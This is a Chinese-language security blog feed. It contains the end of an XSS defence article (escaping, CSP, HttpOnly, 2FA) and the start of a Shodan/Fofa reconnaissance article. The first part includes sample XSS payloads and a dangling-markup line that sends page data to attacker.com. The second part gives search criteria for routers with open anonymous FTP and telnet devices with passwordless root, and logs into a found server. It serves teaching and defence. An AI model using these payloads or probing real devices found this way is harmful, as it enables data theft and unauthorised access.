&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; q &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;hello&#39;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// 從網址列拿下來的參數&lt;/span&gt;&lt;br&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;.search&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; q&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這時如果你把 q 換成 HTML：&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。&lt;/p&gt;
&lt;p&gt;最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 &lt;a href=&quot;https://github.com/cure53/DOMPurify&quot;&gt;DOMPurify&lt;/a&gt; 或是 &lt;a href=&quot;https://github.com/leizongmin/js-xss&quot;&gt;js-xss&lt;/a&gt; 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。&lt;/p&gt;
&lt;p&gt;雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（&lt;a href=&quot;https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/&quot;&gt;Mutation XSS via namespace confusion – DOMPurify &amp;lt; 2.0.17 bypass&lt;/a&gt;）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：&lt;a href=&quot;https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b&quot;&gt;防止 XSS 可能比想像中困難&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;意識到哪邊是使用者可以自己輸入資料的地方&lt;/li&gt;
&lt;li&gt;針對不同情境去做 XSS 的防禦&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;也可以考慮導入現成的 &lt;a href=&quot;https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/&quot;&gt;WAF&lt;/a&gt;（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。&lt;br&gt;
或是也可以關心一下這個比較新的東西：&lt;a href=&quot;https://web.dev/trusted-types/&quot;&gt;Trusted Types&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C&quot;&gt;#&lt;/a&gt; 第二關：阻止惡意程式碼被執行&lt;/h2&gt;
&lt;p&gt;假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。&lt;/p&gt;
&lt;p&gt;這一關的重點是 CSP，Content Security Policy。&lt;/p&gt;
&lt;p&gt;CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag 來指定頁面的 CSP 規則。&lt;/p&gt;
&lt;p&gt;舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;Content&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Security&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Policy&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;src &lt;span class=&quot;token string&quot;&gt;&#39;self&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; script&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;src &lt;span class=&quot;token string&quot;&gt;&#39;self&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;self&lt;/code&gt; 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png&quot; alt=&quot;xss2&quot;&gt;&lt;/p&gt;
&lt;p&gt;CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：&lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy Reference&lt;/a&gt;。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：&lt;/p&gt;
&lt;pre class=&quot;language-csp&quot;&gt;&lt;code class=&quot;language-csp&quot;&gt;&lt;span class=&quot;token directive keyword&quot;&gt;default-src&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;none&#39;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;base-uri&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;self&#39;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;block-all-mixed-content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;connect-src&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;self&#39;&lt;/span&gt; uploads.github.com www.githubstatus.com collector.githubapp.com&lt;br&gt;api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com&lt;br&gt;github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com&lt;br&gt;html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com&lt;br&gt;&lt;span class=&quot;token unsafe function&quot;&gt;*&lt;/span&gt;.actions.githubusercontent.com wss://&lt;span class=&quot;token unsafe function&quot;&gt;*&lt;/span&gt;.actions.githubusercontent.com online.visualstudio.com/api/v1/locations&lt;br&gt;insights.github.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;font-src&lt;/span&gt; github.githubassets.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;form-action&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;self&#39;&lt;/span&gt; github.com gist.github.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;frame-ancestors&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;none&#39;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;frame-src&lt;/span&gt; render.githubusercontent.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;img-src&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;self&#39;&lt;/span&gt; data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com&lt;br&gt;secured-user-images.githubusercontent.com/ &lt;span class=&quot;token unsafe function&quot;&gt;*&lt;/span&gt;.githubusercontent.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;manifest-src&lt;/span&gt; &lt;span class=&quot;token safe selector&quot;&gt;&#39;self&#39;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;media-src&lt;/span&gt; github.com user-images.githubusercontent.com/;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;script-src&lt;/span&gt; github.githubassets.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;style-src&lt;/span&gt; &lt;span class=&quot;token unsafe function&quot;&gt;&#39;unsafe-inline&#39;&lt;/span&gt; github.githubassets.com;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token directive keyword&quot;&gt;worker-src&lt;/span&gt; github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 &lt;a href=&quot;https://csp-evaluator.withgoogle.com/&quot;&gt;CSP Evaluator&lt;/a&gt;，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。&lt;/p&gt;
&lt;p&gt;這邊可以看到 script-src 的值只有 &lt;code&gt;github.githubassets.com&lt;/code&gt;。因為沒有 &lt;code&gt;unsafe-inline&lt;/code&gt; 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 &lt;code&gt;github.githubassets.com&lt;/code&gt; 這個來源引入，幾乎封死了執行 script 的路。&lt;/p&gt;
&lt;p&gt;而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 &lt;a href=&quot;https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html&quot;&gt;A Wormable XSS on HackMD!&lt;/a&gt; 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；&lt;a href=&quot;https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md&quot;&gt;HackMD Stored XSS &amp;amp; Bypass CSP with Google Tag Manager&lt;/a&gt; 則是用 Google Tag Manager 來繞。&lt;/p&gt;
&lt;p&gt;另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：&lt;a href=&quot;https://github.com/google/security-research-pocs/tree/master/script-gadgets&quot;&gt;Breaking XSS mitigations via Script gadgets&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;那如果真的沒辦法執行 script，還有什麼可以做的呢？&lt;/p&gt;
&lt;p&gt;就算只是插入 HTML，也還是可以做事的。&lt;/p&gt;
&lt;p&gt;例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;https://example.com&amp;quot;&amp;gt;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;或者是插入 &lt;code&gt;&amp;lt;img src=&amp;quot;https://attacker.com?q=&lt;/code&gt;（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://attacker.com?q=&lt;br&gt;&amp;lt;div&gt;user info&amp;lt;/div&gt;&lt;br&gt;&amp;lt;div&gt;sensitive data&amp;lt;/div&gt;&lt;br&gt;&amp;lt;div class=&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token attr-name&quot;&gt;test&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;藉由 src 沒有閉合的 &lt;code&gt;&amp;quot;&lt;/code&gt;，就可以拿到下一個 &lt;code&gt;&amp;quot;&lt;/code&gt; 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 &lt;code&gt;img-src&lt;/code&gt; 的 CSP 規則也是有用處的，可以防止這類型的攻擊。&lt;/p&gt;
&lt;p&gt;或也可以結合 &lt;a href=&quot;https://blog.huli.tw/2021/01/23/dom-clobbering/&quot;&gt;DOM Clobbering&lt;/a&gt;，看看有沒有什麼地方可以攻擊。&lt;/p&gt;
&lt;p&gt;因此，就算不能執行 script，依然有其他攻擊手法可以用。&lt;/p&gt;
&lt;p&gt;GitHub 在 2017 年時有寫過一篇 &lt;a href=&quot;https://github.blog/2017-01-19-githubs-post-csp-journey/&quot;&gt;GitHub’s post-CSP journey&lt;/a&gt;，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 &lt;a href=&quot;https://bounty.github.com/targets/csp.html&quot;&gt;GitHub CSP&lt;/a&gt;，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3&quot;&gt;#&lt;/a&gt; 第三關：降低 XSS 攻擊之損害&lt;/h2&gt;
&lt;p&gt;如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。&lt;/p&gt;
&lt;p&gt;這邊我覺得有兩個面向可以去思考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;避免攻擊者用受害者的身份登入&lt;/li&gt;
&lt;li&gt;避免攻擊者透過 XSS 進行比較重要的操作&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 &lt;code&gt;HttpOnly&lt;/code&gt;，就能確保前端無法直接用 document.cookie 就取得 cookie。&lt;/p&gt;
&lt;p&gt;如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。&lt;/p&gt;
&lt;p&gt;再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。&lt;/p&gt;
&lt;p&gt;以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。&lt;/p&gt;
&lt;p&gt;這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png&quot; alt=&quot;xss3&quot;&gt;&lt;/p&gt;
&lt;p&gt;其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？&lt;/li&gt;
&lt;li&gt;儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding&lt;/li&gt;
&lt;li&gt;CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？&lt;/li&gt;
&lt;li&gt;2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？&lt;/li&gt;
&lt;li&gt;忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。&lt;/p&gt;
&lt;p&gt;在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。&lt;/p&gt;
&lt;p&gt;所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>駭客起手式 : Shodan &amp; Fofa</title>
		<link href="https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/"/>
		<updated>2021-06-28T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;處於資訊爆炸時代，遇到問題的第一步通常就是去 Google 一下，駭客們當然也是這樣想，不過除了 Google Hacking 以外駭客有更專門的搜尋引擎。&lt;/p&gt;
&lt;p&gt;本文會先簡單介紹一下駭客常用的搜尋引擎，重點則放在實際案例說明與分享，看一下免費用戶可以做到什麼程度的攻擊，最後討論一下如何避免被找到，打不過駭客難道還躲不起 ?&lt;/p&gt;
&lt;h2 id=&quot;%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9&quot;&gt;#&lt;/a&gt; 工具介紹&lt;/h2&gt;
&lt;p&gt;提到駭客搜尋引擎，有資安背景的朋友第一個會想到的就是大名鼎鼎的 Shodan，但本文除了介紹老牌的 Shodan 之外還要介紹另一個後起之秀 Fofa，就像我們覺得 IE 或 Safari 不順手的時候就會改用 Chrome 或 Firefox一樣，駭客也會嘗試用不同的方法來找到攻擊目標。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__gX36EdhP1jdHBn6tWpMG7g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;1.-%E7%B0%A1%E4%BB%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-%E7%B0%A1%E4%BB%8B&quot;&gt;#&lt;/a&gt; 1. 簡介&lt;/h3&gt;
&lt;p&gt;Shodan 是聯網裝置的搜尋引擎，從網站主機到各種 IOT 設備都可以在上面找到，背後有無數台爬蟲伺服器 24 小時在收集全世界的資料，雖然這個網站的初衷是讓使用者檢查自己的設備或服務是否暴露在外網，但駭客們利用搜尋規則從 Shodan 的資料庫中快速找出有弱點的設備並攻擊，攻擊能影響範圍直接提升到了世界級，所以稱 Shodan 為最危險的搜尋引擎一點也不過分。&lt;/p&gt;
&lt;h3 id=&quot;2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A&quot;&gt;#&lt;/a&gt; 2. 搜尋規則 :&lt;/h3&gt;
&lt;p&gt;規則分為 10 大類，最常用的是 General，其他類別是針對特定領域的搜尋，而且有些需要付費會員才可使用，後面會舉一些實際應用的例子。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__q9RtyVHUj4IJ4uivxn5NNw.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__xrdSmu1pLtoImh3Ab____fCg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;1.-%E7%B0%A1%E4%BB%8B-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-%E7%B0%A1%E4%BB%8B-%3A&quot;&gt;#&lt;/a&gt; 1. 簡介 :&lt;/h3&gt;
&lt;p&gt;Fofa 是中國資安廠商白帽匯推出的搜尋引擎，擁有不遜於 Shodan 的龐大資料庫，能夠快速進行聯網裝置匹配，進行漏洞影響範圍分析、應用分佈統計、應用流行度等。&lt;/p&gt;
&lt;h3 id=&quot;2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2&quot;&gt;#&lt;/a&gt; 2. 搜尋規則 :&lt;/h3&gt;
&lt;p&gt;這邊為了方便之後進行比較，用了類似 Shodan 的方式來將 Fofa 的規則分類，也可看出 Fofa 將重點放在網站相關的搜尋，而且多了一些分析用的規則，像是時間限制、數量統計等，一樣有部分規則付費用戶才能使用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__zlEjdhzf6j30K4MS1PqQLA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB&quot;&gt;#&lt;/a&gt; 實例分享&lt;/h2&gt;
&lt;p&gt;這邊會先分享幾種真實的攻擊案例，讓大家體驗一下當駭客的感覺，同時比較一下兩種工具找到的結果數量，然後再分享幾種各工具特有的查詢案例，請注意過程中請避免蓄意破壞，造成的影響一律自行承擔。&lt;/p&gt;
&lt;h3 id=&quot;%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)&quot;&gt;#&lt;/a&gt; 案例 1 : 檔案分享伺服器 (FTP)&lt;/h3&gt;
&lt;h4 id=&quot;%E9%A7%AD%E5%AE%A2-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2-%3A&quot;&gt;#&lt;/a&gt; 駭客 :&lt;/h4&gt;
&lt;p&gt;硬碟空間不夠了，拿別人的來頂一下，順便丟個後門上去。&lt;/p&gt;
&lt;h4 id=&quot;%E8%AA%AA%E6%98%8E-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%AA%E6%98%8E-%3A&quot;&gt;#&lt;/a&gt; 說明 :&lt;/h4&gt;
&lt;p&gt;ASUS 型號為 RT-AC66U 的路由器有支援 FTP Server 的功能，問題出在於該 設備開放匿名登入，而且匿名使用者竟然有上傳與下載的權限，所以只要找到後誰都可以使用，駭客還可以藉此打進內網，攻擊有連到該台路由器上的設備。&lt;/p&gt;
&lt;h4 id=&quot;%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A&quot;&gt;#&lt;/a&gt; 搜尋條件 :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Port : 21&lt;/li&gt;
&lt;li&gt;回應內容包含 : RT-AC66R&lt;/li&gt;
&lt;li&gt;回應內容排除 : 530 (排除禁用匿名登入的設備)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Shodan : 11 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__2CX2MOE5o2IXsXP9D__R__aA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; Fofa : 33 筆結果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__KOu4aEsUhDrMC43U6C4Zww.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server&quot;&gt;#&lt;/a&gt; 驗證 : 連接到 Shodan 搜索結果中的 FTP Server&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/shodan-fofa/1__fn__pwtV47j3h44FFR__v47Q.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)&quot;&gt;#&lt;/a&gt; 案例 2 : 遠端控制 (Telnet)&lt;/h3&gt;
&lt;h4 id=&quot;%E9%A7%AD%E5%AE%A2-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A7%AD%E5%AE%A2-%3A-2&quot;&gt;#&lt;/a&gt; 駭客 :&lt;/h4&gt;
&lt;p&gt;用自己的電腦幹大事怕被發現，那用別人的不就好了。&lt;/p&gt;
&lt;h4 id=&quot;%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%AA%E6%98%8E-%3A-2&quot;&gt;#&lt;/a&gt; 說明 :&lt;/h4&gt;
&lt;p&gt;有台型號 p750(沒查出是誰家的)的設備開啟了 Telnet Server，登入不需要帳密而且一進去就有 Root 權限，對駭客來說根本是送分題。&lt;/p&gt;
